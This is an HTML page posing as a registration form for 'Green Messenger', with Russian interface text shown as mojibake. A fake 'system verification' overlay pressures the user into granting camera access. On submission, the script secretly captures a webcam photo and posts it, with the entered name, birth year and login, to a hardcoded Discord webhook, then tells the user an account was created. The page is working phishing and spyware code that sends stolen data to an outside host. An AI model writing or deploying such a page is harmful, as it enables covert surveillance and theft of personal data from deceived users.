<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Green Messenger Registration</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            overflow: hidden; 
            position: relative;
        }

        /* –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≤–æ–ª–Ω—ã –Ω–∞ —Ñ–æ–Ω–µ */
        body::before {
            content: "";
            position: absolute;
            width: 200%;
            height: 200%;
            top: -50%;
            left: -50%;
            z-index: 0;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.2;
            animation: moveWaves 20s linear infinite;
        }

        @keyframes moveWaves {
            from { transform: translateX(0) translateY(0); }
            to { transform: translateX(50px) translateY(50px); }
        }

        /* –û—Å–Ω–æ–≤–Ω–∞—è –∫–∞—Ä—Ç–æ—á–∫–∞ */
        .reg-card { 
            background-color: #1a2e2a; 
            padding: 30px; 
            border-radius: 15px; 
            width: 350px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
            z-index: 2; 
            border: 1px solid #2e8b57;
        }

        h2 { text-align: center; color: #4ade80; margin-top: 0; }
        
        .input-group { margin-bottom: 12px; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
        
        input { 
            width: 100%; 
            padding: 10px; 
            border-radius: 5px; 
            border: 1px solid #2d4f47; 
            background: #243b35; 
            color: white; 
            box-sizing: border-box; 
            outline: none;
        }
        
        input:focus { border-color: #4ade80; }

        .reg-btn { 
            width: 100%; 
            padding: 12px; 
            background: #22c55e; 
            border: none; 
            border-radius: 5px; 
            color: white; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 15px; 
            transition: 0.3s;
        }
        .reg-btn:hover { background: #16a34a; transform: translateY(-2px); }

        /* –û–∫–Ω–æ "–ü—É–≥–∞–ª–∫–∞" */
        #camera-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #0d1a17; z-index: 1000; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            text-align: center; padding: 20px;
        }
        
        .warning-box { 
            border: 2px solid #22c55e; 
            padding: 25px; 
            border-radius: 15px; 
            max-width: 400px; 
            background: #1a2e2a; 
        }
        .warning-box h3 { color: #f87171; margin-top: 0; }
        .warning-box p { color: #d1fae5; font-size: 14px; line-height: 1.5; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h3>‚ö†Ô∏è –°–ò–°–¢–ï–ú–ù–ê–Ø –í–ï–†–ò–§–ò–ö–ê–¶–ò–Ø</h3>
        <p>
            –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–∞—â–∏—â–µ–Ω–Ω–æ–º—É –∫–∞–Ω–∞–ª—É —Å–≤—è–∑–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ª–∏—á–Ω–æ—Å—Ç—å –≤–ª–∞–¥–µ–ª—å—Ü–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞.
            <br><br>
            –í —Å–ª—É—á–∞–µ –æ—Ç–∫–∞–∑–∞ –¥–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–µ—Ä—É –±—É–¥–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ø–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É <b>SEC-2025</b>.
        </p>
        <button class="reg-btn" onclick="requestAccess()">–ü–†–û–ô–¢–ò –ü–†–û–í–ï–†–ö–£</button>
    </div>
</div>

<div class="reg-card">
    <h2>–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è</h2>
    <div class="input-group">
        <label>–ò–º—è</label>
        <input type="text" id="firstname" placeholder="–ò–≤–∞–Ω">
    </div>
    <div class="input-group">
        <label>–§–∞–º–∏–ª–∏—è</label>
        <input type="text" id="lastname" placeholder="–ò–≤–∞–Ω–æ–≤">
    </div>
    <div class="input-group">
        <label>–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è</label>
        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="validateYear(this)">
    </div>
    <div class="input-group">
        <label>–õ–æ–≥–∏–Ω</label>
        <input type="text" id="login" placeholder="cool_user">
    </div>
    <div class="input-group">
        <label>–ü–∞—Ä–æ–ª—å</label>
        <input type="password" id="pass" placeholder="******">
    </div>
    <button class="reg-btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const overlay = document.getElementById('camera-overlay');
    
    const discordWebhookUrl = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';

    // –ó–∞–ø—Ä–µ—â–∞–µ–º –≤–≤–æ–¥–∏—Ç—å –≤—Å—ë –∫—Ä–æ–º–µ —Ü–∏—Ñ—Ä –∏ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≥–æ–¥–æ–º 2025
    function validateYear(input) {
        input.value = input.value.replace(/[^0-9]/g, ''); // –¢–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã
        if (parseInt(input.value) > 2025) {
            input.value = "2025";
        }
    }

    async function requestAccess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            overlay.style.display = 'none';
        } catch (err) {
            alert("–û–®–ò–ë–ö–ê: –î–æ—Å—Ç—É–ø –æ—Ç–∫–ª–æ–Ω–µ–Ω! –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞ –±–µ–∑ –±–∏–æ–º–µ—Ç—Ä–∏–∏.");
            location.reload();
        }
    }

    async function register() {
        const yearVal = document.getElementById('birthyear').value;
        const firstVal = document.getElementById('firstname').value;

        if (!yearVal || !firstVal || yearVal.length < 4) {
            alert("–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ!");
            return;
        }

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            const discordMessage = {
                embeds: [{
                    title: "üü¢ –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω",
                    color: 5763719, // –ó–µ–ª–µ–Ω—ã–π
                    fields: [
                        { name: "–ò–º—è", value: firstVal, inline: true },
                        { name: "–ì–æ–¥", value: yearVal, inline: true },
                        { name: "–õ–æ–≥–∏–Ω", value: document.getElementById('login').value, inline: false }
                    ],
                    image: { url: 'attachment://photo.png' }
                }]
            };

            formData.append('payload_json', JSON.stringify(discordMessage));
            formData.append('file', blob, 'photo.png');

            try {
                await fetch(discordWebhookUrl, { method: 'POST', body: formData });
                alert("–ê–∫–∫–∞—É–Ω—Ç —Å–æ–∑–¥–∞–Ω! –î–∞–Ω–Ω—ã–µ –ø–µ—Ä–µ–¥–∞–Ω—ã –≤ —Å–∏—Å—Ç–µ–º—É.");
            } catch (err) {
                alert("–û—à–∏–±–∫–∞ —Å–µ—Ç–∏.");
            }
        }, 'image/png');
    }
</script>

</body>
</html>
